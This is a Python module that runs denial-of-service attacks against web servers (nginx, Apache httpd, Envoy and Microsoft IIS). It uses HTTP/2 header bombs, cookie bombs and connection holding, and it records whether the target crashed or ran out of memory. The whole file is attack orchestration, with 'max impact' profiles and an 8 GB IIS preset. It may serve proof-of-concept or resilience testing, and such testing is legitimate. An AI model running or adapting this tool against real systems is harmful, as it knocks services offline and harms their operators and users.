"""Single-run attack execution (nginx/cookie/IIS)."""
from __future__ import annotations

import sys
import threading
import time
import uuid

from attack_config import (
    AttackConfig,
    CookieAttackConfig,
    profile_apex_cookie_envoy,
    profile_apex_cookie_httpd,
    profile_apex_iis_mp,
    profile_max_impact,
)
from cookie_bomb_enhanced import (
    bomb_connections_batched,
    close_cookie_connections,
    establish_cookie,
    hold_cookie_connections,
)
from h2_enhanced import (
    bomb_connections,
    configure_h2_variant,
    establish_enhanced,
    hold_connections,
)
from models import RunResult
from persistence import persist_run, utc_now
from probe import monitor_during, probe_server
from variants import get_variant, set_poc_path


def run_cookie_attack(
    strategy: str,
    host: str,
    port: int,
    connections: int,
    cfg: CookieAttackConfig,
    bind_ips: list[str | None] | None = None,
    notes: str = "",
    variant_id: str = "httpd",
) -> RunResult:
    run_id = str(uuid.uuid4())[:8]
    t0 = time.monotonic()
    bind_ips = bind_ips or [None]
    spec = get_variant(variant_id)

    probe_before = probe_server(host, port)
    during_samples: list = []
    stop_mon = threading.Event()
    mon = threading.Thread(
        target=monitor_during, args=(host, stop_mon, during_samples), kwargs={"port": port}, daemon=True
    )
    mon.start()

    conns = establish_cookie(host, port, connections, cfg, bind_ips, server_name=host)
    established = len(conns)
    bomb_ok, wire, bomb_errors = bomb_connections_batched(conns, cfg, server_name=host)

    if cfg.hold > 0:
        hold_cookie_connections(conns, cfg)

    active_end = sum(1 for c in conns if c.active)
    close_cookie_connections(conns)

    stop_mon.set()
    mon.join(timeout=5)
    probe_after = probe_server(host, port, timeout=20)
    worst = max((s.latency_sec for s in during_samples if s.latency_sec), default=None)
    probe_during = during_samples[-1] if during_samples else None
    server_down = any(not s.ok for s in during_samples) or not probe_after.ok
    oom_likely = server_down or (probe_after.http_code in (502, 503, 500) if probe_after.http_code else False)

    result = RunResult(
        run_id=run_id,
        timestamp=utc_now(),
        strategy=strategy,
        target=f"{host}:{port}",
        connections_requested=connections,
        connections_established=established,
        connections_bomb_ok=bomb_ok,
        connections_active_end=active_end,
        wire_mb=wire / 1024 / 1024,
        hold_sec=cfg.hold,
        bind_ips=[b or "default" for b in bind_ips],
        probe_before=probe_before,
        probe_during=probe_during,
        probe_after=probe_after,
        probe_worst_latency=worst,
        server_down=server_down,
        oom_likely=oom_likely,
        duration_sec=time.monotonic() - t0,
        notes=notes or f"cookie variant={cfg.variant} streams={cfg.streams} refs={cfg.refs}",
        extra={
            "variant": variant_id,
            "kind": spec.kind,
            "during_probe_count": len(during_samples),
            "attack_config": cfg.to_extra(),
            "est_server_mb": round(cfg.est_server_mb_per_conn() * bomb_ok, 1),
            "bomb_errors_sample": bomb_errors[:20],
            "bomb_error_count": len(bomb_errors),
        },
    )
    persist_run(result)
    return result


def run_attack(
    strategy: str,
    host: str,
    port: int,
    connections: int,
    hold: int = 180,
    drip: int = 30,
    bomb_mode: str = "sequential",
    bind_ips: list[str | None] | None = None,
    notes: str = "",
    cfg: AttackConfig | None = None,
    variant: str = "nginx",
) -> RunResult:
    spec = get_variant(variant)
    if spec.kind == "cookie":
        cookie_cfg = profile_apex_cookie_httpd() if variant == "httpd" else profile_apex_cookie_envoy()
        return run_cookie_attack(strategy, host, port, connections, cookie_cfg, bind_ips, notes, variant)
    if spec.kind == "iis":
        return run_iis_apex_mp(host, port, preset_name="8gb")

    set_poc_path(variant)
    configure_h2_variant(variant)
    run_id = str(uuid.uuid4())[:8]
    t0 = time.monotonic()
    bind_ips = bind_ips or [None]

    if cfg is None:
        cfg = profile_max_impact()
        cfg = AttackConfig(
            streams=128,
            headers=32000,
            hold=hold,
            drip=drip,
            hold_mode="drip",
            bomb_mode=bomb_mode,
        )
    else:
        cfg = AttackConfig(
            streams=cfg.streams,
            headers=cfg.headers,
            hold=hold if hold != 180 else cfg.hold,
            drip=drip if drip != 30 else cfg.drip,
            hold_mode=cfg.hold_mode,
            waves_per_conn=cfg.waves_per_conn,
            wave_gap_sec=cfg.wave_gap_sec,
            conn_stagger_sec=cfg.conn_stagger_sec,
            bomb_mode=bomb_mode if bomb_mode != "sequential" else cfg.bomb_mode,
            bomb_batch_size=cfg.bomb_batch_size,
            bomb_batch_gap_sec=cfg.bomb_batch_gap_sec,
            drip_bytes=cfg.drip_bytes,
        )

    probe_before = probe_server(host, port)
    during_samples: list = []
    stop_mon = threading.Event()
    mon = threading.Thread(
        target=monitor_during, args=(host, stop_mon, during_samples), kwargs={"port": port}, daemon=True
    )
    mon.start()

    conns = establish_enhanced(host, port, connections, cfg, bind_ips)
    established = len(conns)
    bomb_ok, wire, bomb_errors = bomb_connections(conns, cfg)
    active_mid = sum(1 for c in conns if c.active)

    if cfg.hold > 0 and active_mid:
        hold_connections(conns, cfg)

    active_end = sum(1 for c in conns if c.active)
    for c in conns:
        c.close()

    stop_mon.set()
    mon.join(timeout=5)
    probe_after = probe_server(host, port, timeout=20)

    worst = max((s.latency_sec for s in during_samples if s.latency_sec), default=None)
    probe_during = during_samples[-1] if during_samples else None
    server_down = any(not s.ok for s in during_samples) or not probe_after.ok
    oom_likely = server_down or (probe_after.http_code in (502, 503, 500) if probe_after.http_code else False)

    result = RunResult(
        run_id=run_id,
        timestamp=utc_now(),
        strategy=strategy,
        target=f"{host}:{port}",
        connections_requested=connections,
        connections_established=established,
        connections_bomb_ok=bomb_ok,
        connections_active_end=active_end,
        wire_mb=wire / 1024 / 1024,
        hold_sec=cfg.hold,
        bind_ips=[b or "default" for b in bind_ips],
        probe_before=probe_before,
        probe_during=probe_during,
        probe_after=probe_after,
        probe_worst_latency=worst,
        server_down=server_down,
        oom_likely=oom_likely,
        duration_sec=time.monotonic() - t0,
        notes=notes or f"streams={cfg.streams} headers={cfg.headers} waves={cfg.waves_per_conn} mode={cfg.hold_mode}",
        extra={
            "variant": variant,
            "kind": spec.kind,
            "during_probe_count": len(during_samples),
            "during_failures": sum(1 for s in during_samples if not s.ok),
            "attack_config": cfg.to_extra(),
            "est_server_mb": round(cfg.est_server_mb_per_conn() * bomb_ok, 1),
            "bomb_errors_sample": bomb_errors[:20],
            "bomb_error_count": len(bomb_errors),
        },
    )
    persist_run(result)
    return result


def run_iis_apex_mp(host: str, port: int, preset_name: str = "8gb") -> RunResult:
    """Launch IIS multiprocess orchestrator (Windows) or print command on Linux."""
    from iis_apex_runner import build_powershell_command, run_on_windows

    run_id = str(uuid.uuid4())[:8]
    t0 = time.monotonic()
    preset = profile_apex_iis_mp(preset_name)
    probe_before = probe_server(host, port)

    if sys.platform == "win32":
        code, out = run_on_windows(host, port, preset)
        notes = f"win32 orchestrator exit={code}"
        extra_out = out[-4000:] if out else ""
    else:
        cmd = build_powershell_command(host, port, preset)
        notes = f"linux stub — run on Windows: {cmd}"
        extra_out = cmd
        code = 0

    probe_after = probe_server(host, port, timeout=20)
    result = RunResult(
        run_id=run_id,
        timestamp=utc_now(),
        strategy=f"apex_iis_mp_{preset_name}",
        target=f"{host}:{port}",
        connections_requested=preset.total_connections(),
        connections_established=preset.processes if sys.platform == "win32" else 0,
        connections_bomb_ok=0,
        connections_active_end=-1,
        wire_mb=0.0,
        hold_sec=0,
        bind_ips=["default"],
        probe_before=probe_before,
        probe_during=None,
        probe_after=probe_after,
        probe_worst_latency=None,
        server_down=not probe_after.ok,
        oom_likely=not probe_after.ok,
        duration_sec=time.monotonic() - t0,
        notes=notes,
        extra={
            "variant": "microsoft-iis",
            "kind": "iis",
            "preset": preset_name,
            "processes": preset.processes,
            "orchestrator_output": extra_out,
            "exit_code": code,
        },
    )
    persist_run(result)
    print(notes, flush=True)
    if sys.platform != "win32":
        print("\n" + extra_out, flush=True)
    return result
